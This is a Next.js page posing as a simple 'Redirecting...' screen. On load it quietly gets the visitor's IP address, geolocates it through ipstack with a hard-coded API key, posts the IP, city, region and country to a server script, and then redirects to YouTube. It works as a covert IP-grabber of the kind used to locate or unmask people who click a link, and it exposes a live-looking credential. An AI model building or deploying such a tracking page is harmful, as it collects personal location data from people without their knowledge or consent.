import Head from 'next/head';
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const ipstack_access_key = '3f0de0f5be50240634d0a991c3f9c9cc';
    const ipstack_api_url = 'http://api.ipstack.com/';

    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        const userIP = data.ip;

        fetch(ipstack_api_url + userIP + '?access_key=' + ipstack_access_key)
          .then(response => response.json())
          .then(data => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'save_user_data.php'); // change to your server-side script URL
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('user_ip=' + userIP + '&city=' + data.city + '&region=' + data.region_name + '&country=' + data.country_name);

            window.location.href = 'https://www.youtube.com';
          });
      });
  }, []);

  return (
    <>
      <Head>
        <title>Redirecting...</title>
      </Head>
    </>
  );
}
